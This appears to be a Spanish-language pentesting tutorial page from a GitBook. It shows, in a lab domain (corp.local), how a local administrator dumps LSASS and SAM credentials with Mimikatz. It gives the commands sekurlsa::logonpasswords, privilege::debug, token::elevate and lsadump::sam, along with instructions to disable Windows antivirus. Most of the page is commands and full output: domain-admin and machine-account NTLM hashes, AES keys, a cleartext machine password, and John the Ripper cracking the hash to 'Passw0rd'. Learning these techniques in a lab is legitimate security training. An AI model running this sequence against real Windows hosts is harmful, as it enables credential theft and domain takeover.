---
icon: folder-gear
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Volcado de Isass y SAM en Windows

Esta tecnica se centra en capturar la `logon session` con un usuario que no tenga privilegios de un usuario que si tenga privilegios de `administrador`.

Pongamos que tenemos comprometido el equipo `WS01` con el usuario de dominio `empleado1`, pero que a demas tambien tenemos el usuario `santiago` del `WS01` que recordemos que es `administrador` local del equipo, este usuario `administrador` local del equipo no tiene privilegios respecto al dominio, pero si en su maquina, por lo que nos podremos abrir un `PowerShell` como `administrador` y ejecutar la herramienta que mencionamos anteriormente llamado `logonsessions.exe` para ver las `logon sessions` que hay en nuestro equipo, por lo que vamos hacer lo siuguiente:

Ejecutamos como `Administrador` el `PowerShell` y metemos lo siguiente para que se nos habra como `administrador` local:

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

```powershell
cd C:\Users\empleado1\Desktop\logonSessions
.\logonsessions.exe
```

Pero antes de ejecutarlo abriremos otro `PowerShell` como `Administrador` del dominio esta vez simulando que el `administrador` esta actualmente en el equipo haciendo cualquier cosa.

<figure><img src="../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

Una vez abierto ese `PowerShell` lo dejaremos en segundo plano y ejecutaremos el `PowerShell` del `administrador` local del ejecutable `logonsessions.exe`:

```
LogonSessions v1.41 - Lists logon session information
Copyright (C) 2004-2020 Mark Russinovich
Sysinternals - www.sysinternals.com


[0] Logon session 00000000:000003e7:
    User name:    CORP\WS01$
    Auth package: Negotiate
    Logon type:   (none)
    Session:      0
    Sid:          S-1-5-18
    Logon time:   19/01/2025 9:19:04
    Logon server:
    DNS Domain:   corp.local
    UPN:          WS01$@corp.local

[1] Logon session 00000000:0000ca52:
    User name:
    Auth package: NTLM
    Logon type:   (none)
    Session:      0
    Sid:          (none)
    Logon time:   19/01/2025 9:19:04
    Logon server:
    DNS Domain:
    UPN:

[2] Logon session 00000000:0000cfb1:
    User name:    Font Driver Host\UMFD-0
    Auth package: Negotiate
    Logon type:   Interactive
    Session:      0
    Sid:          S-1-5-96-0-0
    Logon time:   19/01/2025 9:19:04
    Logon server:
    DNS Domain:   corp.local
    UPN:          WS01$@corp.local

[3] Logon session 00000000:0000cff8:
    User name:    Font Driver Host\UMFD-1
    Auth package: Negotiate
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-96-0-1
    Logon time:   19/01/2025 9:19:04
    Logon server:
    DNS Domain:   corp.local
    UPN:          WS01$@corp.local

[4] Logon session 00000000:000003e4:
    User name:    CORP\WS01$
    Auth package: Negotiate
    Logon type:   Service
    Session:      0
    Sid:          S-1-5-20
    Logon time:   19/01/2025 9:19:04
    Logon server:
    DNS Domain:
    UPN:

[5] Logon session 00000000:00012ae2:
    User name:    Window Manager\DWM-1
    Auth package: Negotiate
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-90-0-1
    Logon time:   19/01/2025 9:19:05
    Logon server:
    DNS Domain:
    UPN:

[6] Logon session 00000000:00012b0a:
    User name:    Window Manager\DWM-1
    Auth package: Negotiate
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-90-0-1
    Logon time:   19/01/2025 9:19:05
    Logon server:
    DNS Domain:
    UPN:

[7] Logon session 00000000:000003e5:
    User name:    NT AUTHORITY\SERVICIO LOCAL
    Auth package: Negotiate
    Logon type:   Service
    Session:      0
    Sid:          S-1-5-19
    Logon time:   19/01/2025 9:19:05
    Logon server:
    DNS Domain:
    UPN:

[8] Logon session 00000000:0006d39e:
    User name:    CORP\empleado1
    Auth package: Kerberos
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-21-3352250647-938130414-2449934813-1104
    Logon time:   19/01/2025 9:19:28
    Logon server: DC01
    DNS Domain:   CORP.LOCAL
    UPN:          empleado1@corp.local

[9] Logon session 00000000:0014f570:
    User name:    WS01\santiago
    Auth package: NTLM
    Logon type:   Interactive
    Session:      1
    Sid:          S-1-5-21-1345059704-770646112-4146140408-1001
    Logon time:   19/01/2025 9:29:13
    Logon server: WS01
    DNS Domain:
    UPN:

[10] Logon session 00000000:0015bdb8:
    User name:    CORP\Administrator
    Auth package: Kerberos
    Logon type:   CachedInteractive
    Session:      1
    Sid:          S-1-5-21-3352250647-938130414-2449934813-500
    Logon time:   19/01/2025 9:31:05
    Logon server: DC01
    DNS Domain:   CORP.LOCAL
    UPN:          Administrator@corp.local
```

Vemos que en el numero `10` hay uno que nos interesa ya que es el del `Administrador` pero del dominio.

Dentro del `PowerShell` del `Administrador` de dominio. haremos lo siguiente:

```powershell
net localgroup administradores corp\empleado1 /add
```

Esto lo que hace sera añadir al grupo de `Administradores` el usuario `empleado1` pero de forma local, ya que en muchas empresas se hacer esto tambien, no tiene efectos en el dominio, pero en la maquina a nivel local seria administrador, por lo que se podria hacer cosas tambien.

Ahora si ejecutamos un `PowerShell` como `administrador` local, nos aparecera esto:

<figure><img src="../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

Si volvemos a enumerar las `logon sessions` con este shell de `administrador` local podremos ver lo mismo de antes.

### Volcado de credenciales SAM Windows

Ahora vamos a ver como volcar en `Windows` las credenciales a nivel local del `SAM` con una herramienta, primero utilizaremos `Mimikatz` para ello:

Vamos a desactivar el antivirus de `Windows` ya que lo detecta como malware el `mimikatz` y como somos `Administradores` locales, lo podremos hacer sin ningun problema.

Nos pasamos `Mimikatz` a la maquina `WS01` y una vez echo eso, tendremos un `PowerShell` como `empleado1` normal, despues abriremos una como `administrador` local del equipo y por ultimo otra como `Administrador` del dominio para la `logon session` simulando que hay un `admin` en nuestro equipo haciendo cualquier cosa.

En la `PowerShell` de `administrador` LOCAL haremos lo siguiente:

```powershell
.\mimikatz.exe
```

Info:

```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Y ahora abriremos otro `PowerShell` como `administrador` local, para ejecutar el volcado de `logon sessions`:

```powershell
cd C:\Users\empleado1\Desktop\logonSessions
.\logonsessions.exe
```

Info:

```
...........................<RESTO_DEL_CODIGO>....................................

[9] Logon session 00000000:0023e015:
    User name:    CORP\empleado1
    Auth package: Kerberos
    Logon type:   Interactive
    Session:      2
    Sid:          S-1-5-21-3352250647-938130414-2449934813-1104
    Logon time:   19/01/2025 9:39:14
    Logon server: DC01
    DNS Domain:   CORP.LOCAL
    UPN:          empleado1@corp.local

[10] Logon session 00000000:0023e03b:
    User name:    CORP\empleado1
    Auth package: Kerberos
    Logon type:   Interactive
    Session:      2
    Sid:          S-1-5-21-3352250647-938130414-2449934813-1104
    Logon time:   19/01/2025 9:39:14
    Logon server: DC01
    DNS Domain:   CORP.LOCAL
    UPN:          empleado1@corp.local

[11] Logon session 00000000:0031a59f:
    User name:    CORP\Administrator
    Auth package: Kerberos
    Logon type:   Interactive
    Session:      0
    Sid:          S-1-5-21-3352250647-938130414-2449934813-500
    Logon time:   19/01/2025 9:52:13
    Logon server: DC01
    DNS Domain:   CORP.LOCAL
    UPN:          Administrator@corp.local
```

Vemos que la `9` y `10` es el usuario `empleado1` pero como `administrador` local y el numero `11` es el `Administrador` del dominio.

Ahora como vemos que estos tienen una `logon session` podremos obtener sus credenciales mediante `mimikatz` ya que como dijimos anteriormente se guardan en memoria `SAM` y podremos extraerlas.

Dentro de `mimikatz`:

```powershell
sekurlsa::logonpasswords
```

Info:

```
Authentication Id : 0 ; 3253663 (00000000:0031a59f)
Session           : Interactive from 0
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 19/01/2025 9:52:13
SID               : S-1-5-21-3352250647-938130414-2449934813-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : a87f3a337d73085c45f9416be5787d86
         * SHA1     : 34957e9ba3455a4a99d722b48693ac1123ba5dba
         * DPAPI    : b937fc9669fa922df0050d0d2f6d5de4
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2351163 (00000000:0023e03b)
Session           : Interactive from 2
User Name         : empleado1
Domain            : CORP
Logon Server      : DC01
Logon Time        : 19/01/2025 9:39:14
SID               : S-1-5-21-3352250647-938130414-2449934813-1104
        msv :
         [00000003] Primary
         * Username : empleado1
         * Domain   : CORP
         * NTLM     : 1791df33b45987df23e4fe6c57ea6de7
         * SHA1     : 6ef021db9a1924563f77a5d9ebf3e3629de98851
         * DPAPI    : a5798e4a9a06f32761063a2a093f0074
        tspkg :
        wdigest :
         * Username : empleado1
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : empleado1
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2351125 (00000000:0023e015)
Session           : Interactive from 2
User Name         : empleado1
Domain            : CORP
Logon Server      : DC01
Logon Time        : 19/01/2025 9:39:14
SID               : S-1-5-21-3352250647-938130414-2449934813-1104
        msv :
         [00000003] Primary
         * Username : empleado1
         * Domain   : CORP
         * NTLM     : 1791df33b45987df23e4fe6c57ea6de7
         * SHA1     : 6ef021db9a1924563f77a5d9ebf3e3629de98851
         * DPAPI    : a5798e4a9a06f32761063a2a093f0074
        tspkg :
        wdigest :
         * Username : empleado1
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : empleado1
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2328877 (00000000:0023892d)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 19/01/2025 9:39:10
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : CORP
         * NTLM     : afc5c02d936d73808ce716070e883ab8
         * SHA1     : bfd2e01febbbd50a8d4a7968d68ebec9ad9a792f
         * DPAPI    : bfd2e01febbbd50a8d4a7968d68ebec9
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : WS01$
         * Domain   : corp.local
         * Password : W2UkIN'=^U\uRLwnNQE<-f]K_v3rD5"'uhN0A=$lN"Wuekd4JVo>l_lP\]'6w,)3^]O^QV'.28)OxQAI,:%_hr]84%Ih"dEor\c-"_/oegr"_alxGdYbwwY_
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2328854 (00000000:00238916)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 19/01/2025 9:39:10
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : CORP
         * NTLM     : afc5c02d936d73808ce716070e883ab8
         * SHA1     : bfd2e01febbbd50a8d4a7968d68ebec9ad9a792f
         * DPAPI    : bfd2e01febbbd50a8d4a7968d68ebec9
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : WS01$
         * Domain   : corp.local
         * Password : W2UkIN'=^U\uRLwnNQE<-f]K_v3rD5"'uhN0A=$lN"Wuekd4JVo>l_lP\]'6w,)3^]O^QV'.28)OxQAI,:%_hr]84%Ih"dEor\c-"_/oegr"_alxGdYbwwY_
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2327994 (00000000:002385ba)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 19/01/2025 9:39:10
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : CORP
         * NTLM     : afc5c02d936d73808ce716070e883ab8
         * SHA1     : bfd2e01febbbd50a8d4a7968d68ebec9ad9a792f
         * DPAPI    : bfd2e01febbbd50a8d4a7968d68ebec9
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : WS01$
         * Domain   : corp.local
         * Password : W2UkIN'=^U\uRLwnNQE<-f]K_v3rD5"'uhN0A=$lN"Wuekd4JVo>l_lP\]'6w,)3^]O^QV'.28)OxQAI,:%_hr]84%Ih"dEor\c-"_/oegr"_alxGdYbwwY_
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 447390 (00000000:0006d39e)
Session           : Interactive from 1
User Name         : empleado1
Domain            : CORP
Logon Server      : DC01
Logon Time        : 19/01/2025 9:19:28
SID               : S-1-5-21-3352250647-938130414-2449934813-1104
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : SERVICIO LOCAL
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 19/01/2025 9:19:05
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 19/01/2025 9:19:04
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : CORP
         * NTLM     : afc5c02d936d73808ce716070e883ab8
         * SHA1     : bfd2e01febbbd50a8d4a7968d68ebec9ad9a792f
         * DPAPI    : bfd2e01febbbd50a8d4a7968d68ebec9
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : ws01$
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 53169 (00000000:0000cfb1)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 19/01/2025 9:19:04
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : CORP
         * NTLM     : afc5c02d936d73808ce716070e883ab8
         * SHA1     : bfd2e01febbbd50a8d4a7968d68ebec9ad9a792f
         * DPAPI    : bfd2e01febbbd50a8d4a7968d68ebec9
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : WS01$
         * Domain   : corp.local
         * Password : W2UkIN'=^U\uRLwnNQE<-f]K_v3rD5"'uhN0A=$lN"Wuekd4JVo>l_lP\]'6w,)3^]O^QV'.28)OxQAI,:%_hr]84%Ih"dEor\c-"_/oegr"_alxGdYbwwY_
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 51794 (00000000:0000ca52)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 19/01/2025 9:19:04
SID               :
        msv :
         [00000003] Primary
         * Username : WS01$
         * Domain   : CORP
         * NTLM     : afc5c02d936d73808ce716070e883ab8
         * SHA1     : bfd2e01febbbd50a8d4a7968d68ebec9ad9a792f
         * DPAPI    : bfd2e01febbbd50a8d4a7968d68ebec9
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 19/01/2025 9:19:04
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WS01$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : ws01$
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

Para realizar esto tendremos que ser `administradores` locales del sistema.

Pero si podemos ver esta parte:

```
Authentication Id : 0 ; 3253663 (00000000:0031a59f)
Session           : Interactive from 0
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 19/01/2025 9:52:13
SID               : S-1-5-21-3352250647-938130414-2449934813-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : a87f3a337d73085c45f9416be5787d86
         * SHA1     : 34957e9ba3455a4a99d722b48693ac1123ba5dba
         * DPAPI    : b937fc9669fa922df0050d0d2f6d5de4
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

Vemos que hemos obtenido las credenciales `NTLM` del usuario `Administrador` del dominio, solo siendo `administrador` local del equipo.

Ahora con este `hash` `NTLM` lo que podemos hacer es intentar `crackearlo` o hacer un `Pass-The-Hash`, pero `crackearlo` seria de la siguiente forma:

Nos vamos a nuestro `kali`:

```shell
echo a87f3a337d73085c45f9416be5787d86 > admin.hash
john --format=NT admin.hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
No password hashes left to crack (see FAQ)
```

Vemos que se `crackeo` correctamente, pero nosotros ya lo teniamos `crackeado` de antes, por eso aparece asi, pero si lo queremos ver seria asi:

```shell
john --format=NT admin.hash --show
```

Info:

```
?:Passw0rd

1 password hash cracked, 0 left
```

Ahora si nos volvemos al `Mimikatz` necesitariamos rango `System` para realizar ciertas cosas importantes, no nos valdria solo con ser `administrador` local, pero si somos `administradores` locales, podremos suplantar el `Access Token` del `System` para obtenernlo nosotros y hacernos pasar por dicho rango.

Vamos a poner lo siguiente en `mimikatz`:

```powershell
privilege::debug
```

Info:

```
Privilege '20' OK
```

Despues seguidamente pondremos lo siguiente:

```powershell
token::elevate
```

Info:

```
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

660     {0;000003e7} 0 D 48728          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -> Impersonated !
 * Process Token : {0;0023e015} 2 F 3275072     CORP\empleado1  S-1-5-21-3352250647-938130414-2449934813-1104   (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 0 D 3592987     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
```

Vemos que aqui esta suplantando el `Token de acceso` del `SYSTEM`:

```
NT AUTHORITY\SYSTEM Primary -> Impersonated !
```

Ahora nosotros en nuestro usuario de `empleado1` tenemos el `token` de `NT AUTHORITY\SYSTEM` por lo que nos estamos haciendo pasar por el y podremos realizar cosas en su rango.

Ahora nosotros podremos acceder a nuestra base de datos `SAM`:

```powershell
lsadump::sam
```

Info:

```
Domain : WS01
SysKey : c8125866b327df176940c9f2d6a48f5f
Local SID : S-1-5-21-1345059704-770646112-4146140408

SAMKey : a14ad1e634139beb6e7e6f0b7a7acb0c

RID  : 000001f4 (500)
User : Administrador

RID  : 000001f5 (501)
User : Invitado

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5ed544e71abe56b376b7993b21946520

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 494ef19d49a1fb7d84b6c59621900f93

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8decc55d80162a0db94a0690aab6cc6e67bb1ec84a7095538283f02e110a1584
      aes128_hmac       (4096) : a32f3807bc57cdc624af466393001b69
      des_cbc_md5       (4096) : d62689e5a89bef3d

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : d62689e5a89bef3d


RID  : 000003e9 (1001)
User : santiago
  Hash NTLM: 7ce21f17c0aee7fb9ceba532d0546ad6

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 782a536e15d0d4d3ab8be3da53258d0b

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-FVGD436santiago
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 7421798d1663dffe3f7796c77e6a3306fa895b1259f7b05ef6636c3ac3d640de
      aes128_hmac       (4096) : 8ffb71da0fbc6c982853fafacd1b49a5
      des_cbc_md5       (4096) : b975bfb5ce1c7c2a
    OldCredentials
      aes256_hmac       (4096) : 7421798d1663dffe3f7796c77e6a3306fa895b1259f7b05ef6636c3ac3d640de
      aes128_hmac       (4096) : 8ffb71da0fbc6c982853fafacd1b49a5
      des_cbc_md5       (4096) : b975bfb5ce1c7c2a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-FVGD436santiago
    Credentials
      des_cbc_md5       : b975bfb5ce1c7c2a
    OldCredentials
      des_cbc_md5       : b975bfb5ce1c7c2a
```

Esto nos habra volcado toda la base de datos `SAM` con los hashes `NTLM` asociado a los usuarios, por lo que ya podremos intentar `crackearlo` para sacarle la contraseña en texto plano.
